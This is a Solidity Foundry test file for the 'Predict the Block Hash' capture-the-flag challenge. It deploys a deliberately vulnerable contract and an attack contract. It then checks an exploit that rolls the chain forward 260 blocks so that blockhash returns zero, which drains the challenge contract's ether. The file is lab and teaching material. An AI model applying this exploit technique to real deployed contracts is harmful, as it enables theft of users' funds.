// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PredictBlockHash.sol";

contract PredictFutureTestTest is Test {
    PredictTheBlockHashChallenge vulnContract;
    PredictBlockHashAttack       attackContract;
 
    function setUp() public {
        vulnContract   = new PredictTheBlockHashChallenge{value: 1 ether}();
        attackContract = new PredictBlockHashAttack{value: 1 ether}();
    }

    // verify initial state. Best practice to have no assertions in setUp()
    // and create separate test to verify initial post-setUp state
    // https://book.getfoundry.sh/tutorials/best-practices
    function testInitialState() public {
        assertEq(address(vulnContract).balance, 1 ether);
        assertEq(address(attackContract).balance, 1 ether);
        assertFalse(vulnContract.isComplete());
    }

    function testAttack() public {
        attackContract.guess(payable(address(vulnContract)));
        
        // advance 260 blocks for settle() & blockhash(settlementBlockNumber) to return 0x00
        vm.roll(block.number+260);

        attackContract.settle(payable(address(vulnContract)));
        
        assertEq(address(vulnContract).balance, 0 ether);
        assertEq(address(attackContract).balance, 2 ether);
        assertTrue(vulnContract.isComplete());
    }
}
